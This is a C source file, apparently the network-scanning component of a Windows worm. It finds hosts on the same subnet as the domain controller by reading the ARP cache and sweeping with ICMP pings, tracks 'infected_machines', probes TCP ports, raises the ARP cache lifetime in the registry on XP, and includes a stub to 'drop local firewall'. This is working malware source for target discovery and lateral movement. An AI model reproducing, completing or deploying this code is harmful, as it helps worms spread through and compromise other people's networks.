#include "main.h"
#include "globals.h"

VOID scan_net(VOID)
{	
	ERROR_CODE					status;

	ICMP_ECHO_REPLY				echo_reply;
	PMIB_IPNETTABLE				net_table;
	PIP_ADAPTER_INFO			adapter_info								= NULL,
								adapter_info_mem							= NULL;
	WSADATA						wsainfo;
	ADDRINFO					local_host;
	PADDRINFO					local_host_info;
	PHOSTENT					local_hostname;
	PSOCKADDR					tmp_address;

	IPAddr						ip_target;

	HANDLE						icmp_handle;

	PDWORD						used_address_pool,
								ptr											= (PDWORD)ip_address_list;
	DWORD						version, 
								major_version, 
								minor_version,
								subnet_length,
								used_address_temp[1024];

	DWORD						tmp_addy, tmp_subnet;

	CHAR						request_data[32];
	CHAR						char_map[]									= CHARACTER_MAP;

	ULONG						size,
								addr,
								net_table_entries;
	UINT						updater										= 0,
								used_address_temp_counter;
	INT							i;

	// Update cache renewal
	irp_cache_renew();

	// Drop local firewall
	status = drop_local_firewall();
	if (!status) {
		//fixme
	}

	while (	(dc_address == 0xcccccccc) ||
			(dc_address == 0xffffffff)) {
		Sleep(100);
	}

#ifdef DEBUG_OUT
	DEBUG("+scan> Scanner has GO signal!");
#endif

	// Setup
	used_address_pool = (PDWORD)VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	zero_used_ip_list = FALSE;

	// Generate request data
	ZeroMemory(request_data, sizeof(request_data));
	for (i = 0; i < (sizeof(request_data) - 1); i++) {
		request_data[i] = char_map[generate_random_byte_range(sizeof(char_map) - 1)];
	}

	// get hostname (FIXME)
	//WSAStartup(MAKEWORD(2,2), &wsainfo);
	ZeroMemory(&local_host, sizeof(ADDRINFO));
	local_hostname = gethostbyname(NULL);
	getaddrinfo((PCSTR)local_hostname->h_name, NULL, &local_host, &local_host_info);
	
	while (TRUE) {
		tmp_address = local_host_info->ai_addr;
		local_host_info = local_host_info->ai_next;
		break;
	}
	//WSACleanup();

	// Get adapter 
	GetAdaptersInfo(NULL, &size);
	adapter_info = (PIP_ADAPTER_INFO)HeapAlloc(GetProcessHeap(), 0, size);
	ZeroMemory(adapter_info, size);
	GetAdaptersInfo(adapter_info, &size);
	adapter_info_mem = adapter_info;

	// Find one of the adapters FIXME
	//BREAK;
	while (adapter_info != NULL) {

		if (adapter_info->Type & MIB_IF_TYPE_ETHERNET) {

			// This is an ethernet interface, check if it's on the same subnet as our PDC
			winet_pton(AF_INET, adapter_info->IpAddressList.IpAddress.String, &tmp_addy);
			winet_pton(AF_INET, adapter_info->IpAddressList.IpMask.String, &tmp_subnet);
			if ((tmp_addy & tmp_subnet) == (dc_address & tmp_subnet)) {
				break;
			}

		}

		adapter_info = adapter_info->Next;
	}

	// Check if there was a failure
	if (adapter_info == NULL) {
#ifdef DEBUG_OUT
		DEBUG("+scan> Failure to obtain local adapter");
#endif
		PANIC;
	}

	/*
	buf_len = IP_ADDRESS_BUFFER_SIZE;
	do {
		ip_adapter_addresses = (PIP_ADAPTER_ADDRESSES)HeapAlloc(GetProcessHeap(), 0, buf_len);
		ZeroMemory((void *)ip_adapter_addresses, buf_len);
		if (ip_adapter_addresses == NULL) {
#ifdef DEBUG_OUT
			send_debug_channel("+scan> Failure in allocating memory");
#ff
			BREAK;
		}

		return_value = GetAdaptersAddresses(	AF_INET, 
												GAA_FLAG_INCLUDE_PREFIX,
												NULL,
												ip_adapter_addresses,
												&buf_len);
		if (return_value == ERROR_BUFFER_OVERFLOW) {
			HeapFree(GetProcessHeap(), 0, ip_adapter_addresses);
			ip_adapter_addresses = NULL;
		} else {
			break;
		}
	} while (return_value == ERROR_BUFFER_OVERFLOW);

	if (return_value != NO_ERROR) {
#ifdef DEBUG_OUT
			send_debug_channel("+scan> Failure in getting adapter info");
#endif
			BREAK;
	}

	current_address = ip_adapter_addresses;
	while (current_address) {

		// Check if this is a valid IPv4 adapter
		if (!(current_address->Flags & IP_ADAPTER_IPV4_ENABLED)) {
			current_address = current_address->Next;
			continue;
		}

		// Check if this is an ethernet device
		if (!(current_address->IfType & IF_TYPE_ETHERNET_CSMACD)) {
			current_address = current_address->Next;
			continue;
		}

		// Check if there is a DNS server
		if (current_address->FirstDnsServerAddress == NULL) {
			current_address = current_address->Next;
			continue;
		}

		break;
	}

	unicast_address		= current_address->FirstUnicastAddress;
	socket_address		= (PSOCKET_ADDRESS)&(unicast_address->Address);
	sockaddr			= socket_address->lpSockaddr;
			
	adapter_info = (PIP_ADAPTER_INFO)HeapAlloc(GetProcessHeap(), 0, sizeof(IP_ADAPTER_INFO));
	ZeroMemory((void *)adapter_info, sizeof(IP_ADAPTER_INFO)); 

#ifdef DEBUG_OUT
	send_debug_channel("+scan> Local address: 0x%08x", *(PDWORD)((DWORD)sockaddr->sa_data + 2));
#endif
	*/

	// Create sync object
	ZeroMemory((void *)&scan_buffer_lock, sizeof(CRITICAL_SECTION));
	InitializeCriticalSection(&scan_buffer_lock);

	// If this is the domain controller, just fill the buffer with the arp cache only - FIXME
#ifndef ENABLE_DC_NET_SCANNING
	if (dc_address == 0xffffffff) {

	}
#endif

	subnet_length = 0;

	icmp_handle = (HANDLE)IcmpCreateFile();

	updater = SCAN_NET_UPDATE_INTERVAL;

	while (TRUE) {

		Sleep(500);
		if (subnet_length == 0) {
			//winet_pton(AF_INET, adapter_info->IpAddressList.IpMask.String, &addr);
			//addr			= *(unsigned long *)((DWORD)sockaddr->sa_data + 2);//inet_addr(adapter_info->IpAddressList.IpMask.String);
			addr			= inet_addr(adapter_info->IpAddressList.IpMask.String);
			subnet_length	= (DWORD)~addr;
			subnet_length = 255;


			//winet_pton(AF_INET, adapter_info->IpAddressList.IpAddress.String, &addr);
			addr			= inet_addr(adapter_info->IpAddressList.IpMask.String);
			//addr			= *(unsigned long *)((DWORD)sockaddr->sa_data + 2);//inet_addr(adapter_info->IpAddressList.IpMask.String);
			ip_target		= (DWORD)addr & ~subnet_length;
		}

		// At every n interval, update the ip address list
		if (updater == SCAN_NET_UPDATE_INTERVAL) {

			EnterCriticalSection(&scan_buffer_lock);

			//DbgPrint("New Table\n");
			if (zero_used_ip_list == TRUE) {

				// Zero used_address_pool
				ZeroMemory(used_address_pool, 0x1000);

				// Copy infected_machines to used_address_pool
#ifdef DEBUG_OUT
				send_debug_channel("+scan> RESETTING TARGET LISTS");
#endif
				
				i = 0;
				while (infected_machines[i] != 0) {

					used_address_pool[i] = infected_machines[i];

					i++;
				}

				zero_used_ip_list = FALSE;
			}


			// Get size of table
			net_table_entries = 0;
			if (GetIpNetTable(NULL, &net_table_entries, 0) == ERROR_INSUFFICIENT_BUFFER) {

				net_table = (PMIB_IPNETTABLE)HeapAlloc(GetProcessHeap(), 0, net_table_entries);


			} else {

				// Fatal error - FIXME
				continue;
			}

			// Get table
			//net_table = (PMIB_IPNETTABLE)HeapAlloc(GetProcessHeap(), 0, sizeof(MIB_IPNETTABLE) + sizeof(MIB_IPNETROW) * net_table_entries);
			ZeroMemory(net_table, net_table_entries);
			//net_table_entries = 1000;
			if (GetIpNetTable(net_table, &net_table_entries, TRUE) != NO_ERROR) {

				updater = 0;

				HeapFree(GetProcessHeap(), 0, net_table);
				LeaveCriticalSection(&scan_buffer_lock);

				Sleep(50);

				continue;
			} 

			/*
#ifdef DEBUG_OUT
			i = 0;
			while (net_table->table[i].dwAddr != 0) {
				if (net_table->table[i].Type == MIB_IPNET_TYPE_DYNAMIC) {
					send_debug_channel("+lsass> NetTable: 0x%08x", net_table->table[i].dwAddr);
				}
				i++;
			}
#endif
			*/

			//net_table_entries /= sizeof(MIB_IPNETROW);

			// Add new addresses
			ZeroMemory(used_address_temp, sizeof(used_address_temp));
			used_address_temp_counter = 0;
			i = 0;
			while (net_table->table[i].dwAddr != 0) {

				// Check if this address matches the DC address, if so, do not add
				if (net_table->table[i].dwAddr == dc_address) {
					i++;
					continue;
				}

				// Check if this is a local adapter address
				// FIXME - Probably not required, as the local adapter isn't in the ARP cache anyway


				if (net_table->table[i].Type != MIB_IPNET_TYPE_DYNAMIC) {
					i++;
					continue;
				}

				// Check if the addy already exists, if it doesn't append to the temp buffer
				ptr = used_address_pool;
				while (*ptr != 0) {

					// Used
					if (*ptr == net_table->table[i].dwAddr) {
						break;
					}

					ptr++;
				}		
				if (*ptr != 0) {
					i++;
					continue;
				}

				// Not used, so set it 
				used_address_temp[used_address_temp_counter] = net_table->table[i].dwAddr;
				used_address_temp_counter++;


				i++;
			}

			if (used_address_temp[0] == 0) {

				updater = 0;

				HeapFree(GetProcessHeap(), 0, net_table);
				LeaveCriticalSection(&scan_buffer_lock);

				Sleep(50);

				continue;
			}

			// Find the end of the main list
			ptr = ip_address_list;
			while (*ptr != 0) {
				ptr++;
			}

			// Append new addresses
			used_address_temp_counter = 0;
			while (used_address_temp[used_address_temp_counter] != 0) {

				*ptr = used_address_temp[used_address_temp_counter];

				ptr++;
				used_address_temp_counter++;
			}

			// Copy addresses to used pool
			ptr = used_address_pool;
			while (*ptr != 0) {
				ptr++;
			}

			used_address_temp_counter = 0;
			while (used_address_temp[used_address_temp_counter] != 0) {

				*ptr = used_address_temp[used_address_temp_counter];

				ptr++;
				used_address_temp_counter++;
			}

			updater = 0;

			HeapFree(GetProcessHeap(), 0, net_table);
			LeaveCriticalSection(&scan_buffer_lock);

			Sleep(50);

			/*
#ifdef DEBUG_OUT
			ptr = ip_address_list;
			while (*ptr != 0) {

				send_debug_channel("+scan> Target List: 0x%08x", *ptr);

				ptr++;
			}
#endif
			*/

		}

		ZeroMemory((void *)&echo_reply, sizeof(ICMP_ECHO_REPLY));
		IcmpSendEcho(	icmp_handle,
						ip_target,
						request_data,
						strlen(request_data),
						NULL,
						(LPVOID)&echo_reply,
						sizeof(ICMP_ECHO_REPLY),
						1);

		ip_target = htonl((htonl(ip_target) + 1));

		subnet_length--;
		updater++;
	}
}

BOOL test_syn_port(DWORD port_number, DWORD target)
{
	struct sockaddr_in		target_address;
	WSADATA					wsadata					= {0};
	SOCKET					socket_out;
	NTSTATUS				ntStatus;

	target_address.sin_addr.S_un.S_addr = target;
	target_address.sin_family			= AF_INET;
	target_address.sin_port				= htons(port_number);

	//WSAStartup(MAKEWORD(2,2), &wsadata);

	socket_out = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (socket_out == INVALID_SOCKET) {
		//WSACleanup();
		return FALSE;
	}

	ntStatus = connect(socket_out, (SOCKADDR *)&target_address, sizeof(struct sockaddr_in));
	if (ntStatus == SOCKET_ERROR) {
		//WSACleanup();
		return FALSE;
	}

	closesocket(socket_out);
	//WSACleanup();
	return TRUE;
}

DWORD get_random_address_from_pool(PDWORD list)
{
	DWORD			*ptr;
	unsigned int	number_of_addresses = 0;
	unsigned int	random_number;
	DWORD			address, tmp;
	int				i;

	// First get the length of the pool (how many addresses there are)

	//BREAK;

	EnterCriticalSection(&scan_buffer_lock);

	ptr = list;

	if (ptr == NULL) {
		address = 0;
		goto exit_function;
	}

	if (*ptr == 0) {
		address = 0;
		goto exit_function;
	}

	while (TRUE) {
		if ((DWORD)*ptr == 0) {
			break;
		}

		number_of_addresses++;
		ptr++;
	}

	if (number_of_addresses == 1) {
		ptr = list;
		tmp = *ptr;
		*ptr = 0;
		address = tmp;
		goto exit_function;
	}

	// Find a random address within that pool
	number_of_addresses--;
	random_number = generate_random_byte_range(number_of_addresses); 

	// Set our address variable
	ptr = ip_address_list;
	address = *(PDWORD)((DWORD)ip_address_list + (DWORD)(random_number * 4));

	// Check if this is the last entry in the list
	if (*(PDWORD)((DWORD)ptr + 4) == 0) {
		*ptr = 0;

		LeaveCriticalSection(&scan_buffer_lock);
		return address;
	}

	// Remove this entry from the list
	ptr = (PDWORD)((DWORD)ip_address_list + (DWORD)(random_number * 4));
	while (*(PDWORD)((DWORD)ptr + 4) != 0) {
		*ptr = *(PDWORD)((DWORD)ptr + 4);
		*(PDWORD)((DWORD)ptr + 4) = 0;
		ptr++;
	}
	/*
	ptr = &ip_address_list[random_number];
	for (i = 0; i < (number_of_addresses - random_number); i++) {
		tmp = (DWORD)(*(ptr + 1));
		*ptr = tmp;
		(DWORD)(*(ptr + 1)) = 0;
		ptr++;
	}
	*/

exit_function:
	LeaveCriticalSection(&scan_buffer_lock);

	return address;
}

DWORD get_local_ip_address(VOID)
{
	ULONG				size;
	IP_ADAPTER_INFO		*adapter_info;
	struct in_addr		address;
	DWORD				ip_address;

	GetAdaptersInfo(NULL, &size);
	adapter_info = (PIP_ADAPTER_INFO)HeapAlloc(GetProcessHeap(), 0, size);
	ZeroMemory(adapter_info, size);
	GetAdaptersInfo(adapter_info, &size);
	
	winet_pton(AF_INET, adapter_info->IpAddressList.IpAddress.String, &(address.S_un.S_addr));

	ip_address = address.S_un.S_addr;

	return ip_address;
}

VOID irp_cache_renew(VOID)
{
	DWORD			version,
					major_version,
					minor_version;

	// Modify the ARP address drop rate
#ifdef MODIFY_ARP_CACHE_RENEW
	version = GetVersion();

	major_version = (DWORD)(LOBYTE(LOWORD(version)));
	minor_version = (DWORD)(HIBYTE(LOWORD(version)));

	// Check for XP
	if ((major_version == 5) && (minor_version == 1)) {

		// Set
		create_registry_key(HKEY_LOCAL_MACHINE, 
							"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters", 
							"ArpCacheLife", 
							0xffffffff);

#ifdef DEBUG_OUT
		DEBUG("+scan> ARP timeout modified for XP");
#endif

	}
#endif

	return;
}


BOOL drop_local_firewall(VOID)
{
	ERROR_CODE		status;
	DWORD			version, version_major, version_minor;

	version = GetVersion();
	version_major = (DWORD)(LOBYTE(LOWORD(version)));
	version_minor = (DWORD)(HIBYTE(LOWORD(version)));
	if ((version_major == 6) && (version_minor == 1)) {
		// Windows 7
		//status = drop_firewall_win7();
		if (!status) {
			return FALSE;
		}
	}

	return TRUE;
}

